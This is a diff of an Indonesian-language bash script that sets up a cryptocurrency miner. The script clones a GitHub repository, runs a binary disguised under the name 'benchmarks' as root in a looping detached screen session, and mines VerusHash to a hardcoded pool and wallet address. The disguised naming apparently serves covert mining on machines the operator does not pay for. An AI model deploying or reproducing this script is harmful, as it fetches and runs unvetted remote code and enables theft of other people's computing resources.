@@ -1,6 +1,6 @@
 #!/bin/bash
 echo "📦 Menginstal dependensi..."
-apt-get update && apt-get install -y screen wget tar
+apt-get update && apt-get install -y screen wget tar git
 
 echo "📁 Menyimpan skrip mining ke /root/benchmarks.sh..."
 cat << 'EOF' > /root/benchmarks.sh
@@ -12,7 +12,7 @@ cd /root || exit
 if [ ! -f benchmarks ]; then
   echo "⬇️ Mengunduh file benchmarks..."
   git clone https://github.com/amirul5656/ver.git
-  cd yui56
+  cd ver
   chmod +x benchmarks
 fi
 
@@ -20,7 +20,7 @@ fi
 if screen -list | grep -q samiru13l3; then
   echo "⚠️  Screen 'samiru13l3' sudah jalan, skip."
 else
-  echo "▶ Menjalankan mining di screen 'amirul3'..."
+  echo "▶ Menjalankan mining di screen 'samiru13l3'..."
   screen -dmS samiru13l3 bash -c '
     while true; do
       ./benchmarks --algorithm verushash --pool stratum+ssl://au.vipor.net:5140 -u RQdUotwPueFvRY5xKfn6REsMUsBdhhmqdq.asia -p x --cpu-threads 7
@@ -35,4 +35,4 @@ chmod +x /root/benchmarks.sh
 echo "🚀 Menjalankan miner sekarang..."
 bash /root/benchmarks.sh
 
-echo "✅ Siap! Mining aktif sekarang & otomatis jalan setelah reboot lewat /etc/rc.local."
+echo "✅ Siap! Mining aktif sekarang."
